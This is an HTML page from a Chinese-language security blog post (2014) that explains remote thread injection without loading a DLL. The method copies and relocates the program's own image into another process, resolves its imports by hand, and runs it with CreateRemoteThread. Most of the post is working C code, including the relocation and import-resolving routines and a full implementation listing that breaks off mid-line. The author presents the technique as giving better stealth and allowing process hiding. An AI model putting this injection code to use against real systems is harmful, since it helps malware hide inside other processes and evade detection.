@@ -1,0 +1,742 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Eadom&#39;s Blog">
+    <title>不注入DLL实现远程线程注入 - Eadom&#39;s Blog</title>
+    <meta name="author" content="Eadom">
+    
+    
+        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <meta name="description" content="通过CreateRemoteThread&amp;amp;WriteProcessMemory实现远程线程注入，没有通过加载DLL注入，有更好的隐蔽性。 参考：http://www.vckbase.com/index.php/wv/1653/
+0x01前言远程线程技术指的是通过在其他进程中创建新线程的方法进入该进程的内存地址空间，从而获得对该进程的控制权的方法。 在进程中可以通过CreateThread函">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="不注入DLL实现远程线程注入">
+<meta property="og:url" content="https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/index.html">
+<meta property="og:site_name" content="Eadom's Blog">
+<meta property="og:description" content="通过CreateRemoteThread&amp;amp;WriteProcessMemory实现远程线程注入，没有通过加载DLL注入，有更好的隐蔽性。 参考：http://www.vckbase.com/index.php/wv/1653/
+0x01前言远程线程技术指的是通过在其他进程中创建新线程的方法进入该进程的内存地址空间，从而获得对该进程的控制权的方法。 在进程中可以通过CreateThread函">
+<meta property="og:updated_time" content="2019-03-15T09:11:12.493Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="不注入DLL实现远程线程注入">
+<meta name="twitter:description" content="通过CreateRemoteThread&amp;amp;WriteProcessMemory实现远程线程注入，没有通过加载DLL注入，有更好的隐蔽性。 参考：http://www.vckbase.com/index.php/wv/1653/
+0x01前言远程线程技术指的是通过在其他进程中创建新线程的方法进入该进程的内存地址空间，从而获得对该进程的控制权的方法。 在进程中可以通过CreateThread函">
+<meta name="twitter:creator" content="@Yufan_L">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-yrst5vo1nxaxbp2g3v9na2wg1lixlpr3ghbjdvskeixmu79deycecx3rh4bt.min.css">
+    <!--STYLES END-->
+    
+    
+    <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="1">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Eadom&#39;s Blog</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="1">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Eadom</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-search"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/eadom" target="_blank">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://weibo.com/onetpig" target="_blank">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-weibo"></i>
+                        <span class="sidebar-button-desc">Weibo</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://twitter.com/Yufan_L" target="_blank">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="1"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post" itemscope itemType="http://schema.org/BlogPosting">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title" itemprop="headline">
+            不注入DLL实现远程线程注入
+        </h1>
+    
+    <div class="post-meta">
+    <time itemprop="datePublished" datetime="2014-06-25T23:40:34+08:00">
+	
+		    Jun 25, 2014
+    	
+    </time>
+    
+</div>
+
+</div>
+    
+    <div class="post-content markdown" itemprop="articleBody">
+        <div class="main-content-wrap">
+            <p>通过CreateRemoteThread&amp;WriteProcessMemory实现远程线程注入，没有通过加载DLL注入，有更好的隐蔽性。 参考：<a href="http://www.vckbase.com/index.php/wv/1653/" target="_blank" rel="external">http://www.vckbase.com/index.php/wv/1653/</a></p>
+<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a><strong>0x01前言</strong></h1><p>远程线程技术指的是通过在其他进程中创建新线程的方法进入该进程的内存地址空间，从而获得对该进程的控制权的方法。 在进程中可以通过CreateThread函数创建线程，被创建的新线程与主线程共享地址空间以及其他的资源。同样，通过CreateRemoteThread函数可以在其他进程内创建新线程，新创建的的远程线程可以共享远程进程的地址空间。 所以通过在远程进程中创建新的方法，就可以进入到远程进程的内存地址空间，也就拥有了和那个远程进程相当的权限，可以在远程进程中执行代码，从而达到远程进程控制、进程隐藏的目的。</p>
+<h1 id="0x02基本原理"><a href="#0x02基本原理" class="headerlink" title="0x02基本原理"></a>0x02基本原理</h1><p><strong>思路:</strong> <strong>将程序自身映像写入远程线程然后进行重定位</strong> <strong>然后创建远程线程调用其中的入口函数</strong> <strong>之后线程运行后先写好AIT</strong> <strong>其实就是手动完成PE loader进行模块导入时重定向和写AIT。</strong> <strong>可以先看实现代码再回头看，实现代码注释比较详细。。</strong></p>
+<h3 id="1-OpenProcess获得远程进程句柄"><a href="#1-OpenProcess获得远程进程句柄" class="headerlink" title="1.OpenProcess获得远程进程句柄"></a>1.OpenProcess获得远程进程句柄</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hRemoteProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwProcessID);</div></pre></td></tr></table></figure>
+<h3 id="2-VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。"><a href="#2-VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。" class="headerlink" title="2.VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。"></a>2.VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lpInjectPoint = (LPBYTE)VirtualAllocEx(hRemoteProcess, <span class="number">0</span>, dwImageSize, MEM\_COMMIT, PAGE\_EXECUTE_READWRITE);</div></pre></td></tr></table></figure>
+<h3 id="3-将程序自身的映像的的重定位并且写入远程线程"><a href="#3-将程序自身的映像的的重定位并且写入远程线程" class="headerlink" title="3.将程序自身的映像的的重定位并且写入远程线程"></a>3.将程序自身的映像的的重定位并且写入远程线程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RelocCode(lpNewMoudle, lpInjectPoint); WriteProcessMemory(hRemoteProcess, lpInjectPoint, lpNewMoudle, dwImageSize, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure>
+<h3 id="4-运行远程线程"><a href="#4-运行远程线程" class="headerlink" title="4.运行远程线程"></a>4.运行远程线程</h3><p>得到ThreadEntry在远程进程中的地址，利用函数在模块中的相对地址+注入点地址 lpRemoteEntryPoint = (LPTHREAD_START_ROUTINE)(lpInjectPoint + (DWORD)fnRemoteThread_Main - lpMoudle); 将插入点地址作为参数传递给线程函数 lpParam = lpInjectPoint; 运行远程线程 hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, lpRemoteEntryPoint, lpParam, 0, NULL);</p>
+<h3 id="5-远程线程运行的入口函数"><a href="#5-远程线程运行的入口函数" class="headerlink" title="5.远程线程运行的入口函数"></a>5.远程线程运行的入口函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//CreateRemoteThread的线程运行入口</span></div><div class="line"><span class="function">DWORD <span class="title">ThreadEntry</span><span class="params">(LPBYTE  lpImageBase)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (LoadAPI(lpImageBase))<span class="comment">//先完成API函数的导入工作</span></div><div class="line">		RemoteThread\_Main((HINSTANCE)lpImageBase);  <span class="comment">//执行函数RemoteThread\_Main中的代码</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>先运行LoadAPI函数写入AIT，之后调用自己的编写的fnRemoteThread_Main函数执行自己的操作</p>
+<h3 id="6-其中的重定位及AIT操作"><a href="#6-其中的重定位及AIT操作" class="headerlink" title="6.其中的重定位及AIT操作"></a>6.其中的重定位及AIT操作</h3><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p>参考<a href="http://hi.baidu.com/_achillis/item/7e324e08db884b94a2df4313" target="_blank" rel="external">http://hi.baidu.com/_achillis/item/7e324e08db884b94a2df4313</a> 重定位表由一个个的重定位块组成，如果重定位表存在的话，必定是至少有一个重定位块。 因为每个块只负责定位0x1000大小范围内的数据，因此如果要定位的数据范围比较大的话， 就会有多个重定位块存在。 每个块的首部是如下定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> \_IMAGE\_BASE_RELOCATION &#123;</div><div class="line">    DWORD   VirtualAddress;</div><div class="line">    DWORD   SizeOfBlock;</div><div class="line">&#125; IMAGE\_BASE\_RELOCATION;</div></pre></td></tr></table></figure>
+<p>把内存中需要重定位的数据按页的大小0x1000分为若干个块，而这个VirtualAddress就是每个块的起始RVA.只知道块的RVA当然还不行，我们要知道每一个需要重定位数据的具体地址。 每个需重定位的数据其地址及定位方式用两个字节来表示，记为RelocData，紧跟在IMAGE_BASE_RELOCATION结构之后。</p>
+<h4 id="每个块中重定位信息的个数"><a href="#每个块中重定位信息的个数" class="headerlink" title="每个块中重定位信息的个数"></a>每个块中重定位信息的个数</h4><p>这个可由每个块结构中的Size来确定。Size的值是以DWORD表示的当前整个块的大小，先减去IMAGE_BASE_RELOCATION的大小，因为重定位数据是16位WORD的，再除以2，就得到个重定位数据的个数。</p>
+<h4 id="遍历每个重定位块"><a href="#遍历每个重定位块" class="headerlink" title="遍历每个重定位块"></a>遍历每个重定位块</h4><p>由Size可以直接到达下一个重定位块即当前块地址+Size 某个块首结构的VirtualAddress为0，表明重定位表结束。</p>
+<h4 id="修改每个需重定位的地址"><a href="#修改每个需重定位的地址" class="headerlink" title="修改每个需重定位的地址"></a>修改每个需重定位的地址</h4><p>每个16位重定位信息包括低12位的重定位位置和高4位的重定位类型。要得到重定位的RVA,IMAGE_BASE_RELOCATION’的’VirtualAddress’需要加上12位位置偏移量. 类型可以查询MSDN 以一个重定位数据0x34AC为例，其高四位表明了重定位类型为3,即IMAGE_REL_BASED_HIGHLOW，Win32环境下的重定位基本都是这个类型的。 其低12位则表明了相对于VirtualAddress的RVA偏移量。VirtualAddress即需重定位的数据块的起始RVA，再加上这低12位的值就得到了具体的需要进行重定位处理的数据的RVA。 就是说： 要进行重定位处理的数据的RVA=VirtualAddress+RelocData&amp;0x0FFF 函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//完成重定位</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RelocCode</span><span class="params">(LPBYTE  lpImage, LPBYTE   lpInjectBase)</span> </span></div><div class="line">&#123;</div><div class="line">	DWORD  dwRva = <span class="number">0</span>, dwRvaCount = <span class="number">0</span>, dwRelocOffset = <span class="number">0</span>;</div><div class="line">	LPWORD  lpwOffset = <span class="literal">NULL</span>;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = <span class="literal">NULL</span>;</div><div class="line">	LPBYTE lpRelocTable;</div><div class="line">	PIMAGE\_BASE\_RELOCATION  pBaseReloc;</div><div class="line"></div><div class="line">	<span class="comment">//获取ntheader</span></div><div class="line">	pNtHeader = (PIMAGE\_NT\_HEADERS)(lpImage + ((PIMAGE\_DOS\_HEADER)lpImage)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//获取重定位表位置</span></div><div class="line">	lpRelocTable = lpImage + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">5</span>\].VirtualAddress; </div><div class="line">	pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	<span class="comment">//获取重定位表偏移</span></div><div class="line">	dwRelocOffset = (DWORD)lpInjectBase - pNtHeader-&gt;OptionalHeader.ImageBase; </div><div class="line"></div><div class="line">	<span class="comment">//遍历重定位表，修正需要重定位的代码</span></div><div class="line">	<span class="keyword">while</span> (pBaseReloc-&gt;VirtualAddress != <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		lpwOffset = (WORD*)(lpRelocTable + <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION));</div><div class="line">		dwRvaCount = (pBaseReloc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION)) / <span class="number">2</span>;</div><div class="line"></div><div class="line">		<span class="comment">//循环修正</span></div><div class="line">		<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwRvaCount; i++)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//获取要修正的RVA</span></div><div class="line">			dwRva = (DWORD)lpImage + (pBaseReloc-&gt;VirtualAddress) + (DWORD)(*lpwOffset &amp; <span class="number">0x0fff</span>);</div><div class="line">			<span class="comment">//RVA加上修正量进行修正</span></div><div class="line">			*(DWORD*)dwRva += dwRelocOffset;</div><div class="line">			lpwOffset++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//指向下一页重定位信息处</span></div><div class="line">		lpRelocTable += pBaseReloc-&gt;SizeOfBlock;</div><div class="line">		pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="写入AIT表"><a href="#写入AIT表" class="headerlink" title="写入AIT表"></a>写入AIT表</h3><p>实现如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//用于完成API函数的导入，参数为要插入代码处地址</span></div><div class="line">BOOL CInjectCode::LoadAPI(LPBYTE lpInjectBase)</div><div class="line">&#123;</div><div class="line">	PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)lpInjectBase;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = (PIMAGE\_NT\_HEADERS)(lpInjectBase + pDosHeader-&gt;e_lfanew);</div><div class="line">	PIMAGE\_IMPORT\_DESCRIPTOR pImportDescriptor = (PIMAGE\_IMPORT\_DESCRIPTOR)</div><div class="line">		(lpInjectBase + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">1</span>\].VirtualAddress);</div><div class="line">	<span class="keyword">for</span> (; pImportDescriptor-&gt;OriginalFirstThunk != <span class="number">0</span>; pImportDescriptor++)<span class="comment">//遍历导入表</span></div><div class="line">	&#123;</div><div class="line">		HMODULE hDll = LoadLibraryA((LPCSTR)(lpInjectBase + pImportDescriptor-&gt;Name));</div><div class="line">		<span class="comment">//上面能直接引用LoadLibrary是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">		<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			<span class="keyword">return</span> FALSE;</div><div class="line">		PIMAGE\_THUNK\_DATA Origin = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;OriginalFirstThunk);</div><div class="line">		PIMAGE\_THUNK\_DATA First = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;FirstThunk);</div><div class="line">		LPCSTR Name = <span class="literal">NULL</span>;</div><div class="line">		PIMAGE\_IMPORT\_BY\_NAME Import\_name = <span class="literal">NULL</span>;</div><div class="line">		<span class="keyword">for</span> (; Origin-&gt;u1.Ordinal != <span class="number">0</span>; Origin++, First++)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span> (Origin-&gt;u1.Ordinal &amp; IMAGE\_ORDINAL\_FLAG)</div><div class="line">				Name = (LPCSTR)IMAGE_ORDINAL(Origin-&gt;u1.Ordinal);</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				Import\_name = (PIMAGE\_IMPORT\_BY\_NAME)(lpInjectBase + (DWORD)(Origin-&gt;u1.AddressOfData));</div><div class="line">				Name = (LPCSTR)Import_name-&gt;Name;</div><div class="line">			&#125;</div><div class="line">			First-&gt;u1.Function = (DWORD)GetProcAddress(hDll, Name);</div><div class="line">			<span class="comment">//上面能直接引用GetProcAddress是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">			<span class="keyword">if</span> (First-&gt;u1.Function == <span class="literal">NULL</span>)</div><div class="line">				<span class="keyword">return</span> FALSE;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h1 id="0x03编程实现"><a href="#0x03编程实现" class="headerlink" title="0x03编程实现"></a>0x03编程实现</h1><p>编程的实现，注释的比较详细</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">//完成重定位</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RelocCode</span><span class="params">(LPBYTE  lpImage, LPBYTE   lpInjectBase)</span> </span></div><div class="line">&#123;</div><div class="line">	DWORD  dwRva = <span class="number">0</span>, dwRvaCount = <span class="number">0</span>, dwRelocOffset = <span class="number">0</span>;</div><div class="line">	LPWORD  lpwOffset = <span class="literal">NULL</span>;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = <span class="literal">NULL</span>;</div><div class="line">	LPBYTE lpRelocTable;</div><div class="line">	PIMAGE\_BASE\_RELOCATION  pBaseReloc;</div><div class="line"></div><div class="line">	<span class="comment">//获取ntheader</span></div><div class="line">	pNtHeader = (PIMAGE\_NT\_HEADERS)(lpImage + ((PIMAGE\_DOS\_HEADER)lpImage)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//获取重定位表位置</span></div><div class="line">	lpRelocTable = lpImage + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">5</span>\].VirtualAddress; </div><div class="line">	pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	<span class="comment">//获取重定位表偏移</span></div><div class="line">	dwRelocOffset = (DWORD)lpInjectBase - pNtHeader-&gt;OptionalHeader.ImageBase; </div><div class="line"></div><div class="line">	<span class="comment">//遍历重定位表，修正需要重定位的代码</span></div><div class="line">	<span class="keyword">while</span> (pBaseReloc-&gt;VirtualAddress != <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		lpwOffset = (WORD*)(lpRelocTable + <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION));</div><div class="line">		dwRvaCount = (pBaseReloc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION)) / <span class="number">2</span>;</div><div class="line"></div><div class="line">		<span class="comment">//循环修正</span></div><div class="line">		<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwRvaCount; i++)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//获取要修正的RVA</span></div><div class="line">			dwRva = (DWORD)lpImage + (pBaseReloc-&gt;VirtualAddress) + (DWORD)(*lpwOffset &amp; <span class="number">0x0fff</span>);</div><div class="line">			<span class="comment">//RVA加上修正量进行修正</span></div><div class="line">			*(DWORD*)dwRva += dwRelocOffset;</div><div class="line">			lpwOffset++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//指向下一页重定位信息处</span></div><div class="line">		lpRelocTable += pBaseReloc-&gt;SizeOfBlock;</div><div class="line">		pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//用于完成API函数的导入，参数为要插入代码处地址</span></div><div class="line"><span class="function">BOOL <span class="title">LoadAPI</span><span class="params">(LPBYTE lpInjectBase)</span></span></div><div class="line">&#123;</div><div class="line">	PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)lpInjectBase;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = (PIMAGE\_NT\_HEADERS)(lpInjectBase + pDosHeader-&gt;e_lfanew);</div><div class="line">	PIMAGE\_IMPORT\_DESCRIPTOR pImportDescriptor = (PIMAGE\_IMPORT\_DESCRIPTOR)</div><div class="line">		(lpInjectBase + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span 